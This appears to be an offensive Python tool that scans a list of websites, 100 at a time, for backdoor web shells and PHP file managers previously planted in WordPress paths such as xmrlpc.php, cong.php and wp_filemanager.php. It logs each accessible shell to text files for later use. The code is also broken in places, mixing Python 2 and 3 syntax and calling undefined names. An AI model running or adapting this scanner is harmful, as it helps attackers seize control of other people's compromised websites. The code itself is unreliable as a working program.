import sys
import requests
import re
import random
import string
from multiprocessing.dummy import Pool
from colorama import Fore, init

init(autoreset=True)
fr = Fore.RED
fg = Fore.GREEN
fc = Fore.CYAN 

banner = '''
            _______          ______         __       __        _______  
           |       \        /      \       |  \  _  |  \      |       \ 
           | $$$$$$$\      |  $$$$$$\      | $$ / \ | $$      | $$$$$$$\

           | $$    $$      | $$  | $$      | $$  $$$\ $$      | $$    $$
           | $$$$$$$       | $$  | $$      | $$ $$\$$\$$      | $$$$$$$ 
           | $$            | $$__/ $$      | $$$$  \$$$$      | $$      
           | $$             \$$    $$      | $$$    \$$$      | $$      
            \$$              \$$$$$$        \$$      \$$       \$$      
                                     
   Note: These are scripts from X-7ROOT, they are separated, and I have collected them in one script   
                      ! Xmrlpc + 403 + PHPFileManager in One Script !   
                              [*] Telegram : @CapitosKamal [*]                                       
\n'''.format(fg)
print(banner)

requests.urllib3.disable_warnings()

try:
    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
    path = str(sys.argv[0]).split('\\')
    exit('\n  [!] Enter <' + path[len(path) - 1] + '> <sites.txt>')

def ran(length):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length))

Pathlist = [
    '/.well-known/pki-validation/xmrlpc.php?p=', '/.well-known/acme-challenge/xmrlpc.php?p=', '/wp-admin/network/xmrlpc.php?p=', '/xmrlpc.php?p=',
    '/cgi-bin/xmrlpc.php?p=', '/css/xmrlpc.php?p=', '/wp-admin/user/xmrlpc.php?p=', '/img/xmrlpc.php?p=', '/wp-admin/css/colors/coffee/xmrlpc.php?p=',
    '/wp-admin/images/xmrlpc.php?p=', '/images/xmrlpc.php?p=', '/wp-admin/js/widgets/xmrlpc.php?p=',
    '/wp-admin/css/colors/xmrlpc.php?p=', '/wp-admin/includes/xmrlpc.php?p=', '/wp-admin/css/colors/blue/xmrlpc.php?p=', '/wp-admin/xmrlpc.php?p='
]

class EvaiLCode:
    def __init__(self):
        self.headers = {
            'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 '
                          '(KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36'
        }

    def URLdomain(self, site):
        if site.startswith("http://"):
            site = site.replace("http://", "")
        elif site.startswith("https://"):
            site = site.replace("https://", "")
        else:
            pass
        pattern = re.compile('(.*)/')
        while re.findall(pattern, site):
            sitez = re.findall(pattern, site)
            site = sitez[0]
        return site

    def checker(self, site):
        try:
            url = "http://" + self.URLdomain(site)
            for Path in Pathlist:
                check = requests.get(url + Path, headers=self.headers, verify=False, timeout=25).content
                if "Tiny File Manager" in check:
                    print('Target:{} --> {}[Succefully]'.format(url, fg))
                    open('Shell.txt', 'a').write(url + Path + "\n")
                    break
                else:
                    print('Target:{} -->! {}[Failid]'.format(url, fr))
        except Exception as e:
            print('Target:{} -->! {}[Error] {}'.format(url, fr, str(e)))

def RunUploader(site):
    try:
        Control = EvaiLCode()
        Control.checker(site)
    except:
        pass

def FourHundredThree(url):
    try:
        url = 'http://' + URLdomain(url)
        check = requests.get(url + '/wp-content/cong.php', headers=headers, allow_redirects=True, timeout=15)
        if 'form method="POST"><input type="password" name="getpwd"' in check.content:
            print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
            open('cong.txt', 'a').write(url + '/wp-content/cong.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url + '/wp-content/plugins/ango/sett.php', headers=headers, allow_redirects=True,
                                 verify=False, timeout=15)
            if '<pre align=center><form method=post>Password:' in check.content:
                print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                open('sett.txt', 'a').write(url + '/wp-content/plugins/ango/sett.php\n')
            else:
                print ' -| ' + url + ' --> {}[Failed]'.format(fr)
    except:
        print ' -| ' + url + ' --> {}[Failed]'.format(fr)

def PHPFileManager(url):
    try:
        url = 'http://' + URLdomain(url)
        check = requests.get(url + '/wp-content/plugins/hellopress/wp_filemanager.php', headers=headers,
                             allow_redirects=True, timeout=15)
        if 'PHP File Manager' in check.content:
            print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
            open('PHPFileManager.txt', 'a').write(url + '/wp-content/plugins/hellopress/wp_filemanager.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url + '/wp-content/plugins/hellopress/wp_filemanager.php', headers=headers,
                                 allow_redirects=True, verify=False, timeout=15)
            if 'PHP File Manager' in check.content:
                print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                open('PHPFileManager.txt', 'a').write(url + '/wp-content/plugins/hellopress/wp_filemanager.php\n')
            else:
                print ' -| ' + url + ' --> {}[Failed]'.format(fr)
    except:
        print ' -| ' + url + ' --> {}[Failed]'.format(fr)

if __name__ == "__main__":
    mp = Pool(100)
    mp.map(RunUploader, target)
    mp.map(FourHundredThree, target)
    mp.map(PHPFileManager, target)
    mp.close()
    mp.join()

    print '\n [!] {}Saved in Shells.txt, cong.txt, sett.txt, and PHPFileManager.txt'.format(fc)
